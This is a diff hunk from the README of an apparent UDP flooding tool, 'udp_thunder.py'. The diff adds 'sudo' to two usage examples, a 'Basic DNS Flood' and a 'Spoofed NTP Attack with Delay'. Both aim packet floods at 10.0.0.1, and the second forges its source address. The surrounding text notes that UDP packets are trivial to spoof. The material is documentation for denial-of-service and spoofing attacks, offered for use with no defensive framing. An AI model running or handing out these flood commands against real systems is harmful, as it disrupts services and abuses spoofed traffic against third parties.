@@ -68,12 +68,12 @@ UDP packets are trivial to spoof:
 ### Basic DNS Flood
 
 ```
-python3 udp_thunder.py -t 10.0.0.1 -P dns -c 500
+sudo python3 udp_thunder.py -t 10.0.0.1 -P dns -c 500
 ```
 
 ### Spoofed NTP Attack with Delay
 ```
-python3 udp_thunder.py -t 10.0.0.1 -P ntp -s 192.168.1.1 -c 200 -v -T 1
+sudo python3 udp_thunder.py -t 10.0.0.1 -P ntp -s 192.168.1.1 -c 200 -v -T 1
 ```
 ### Options
 ```
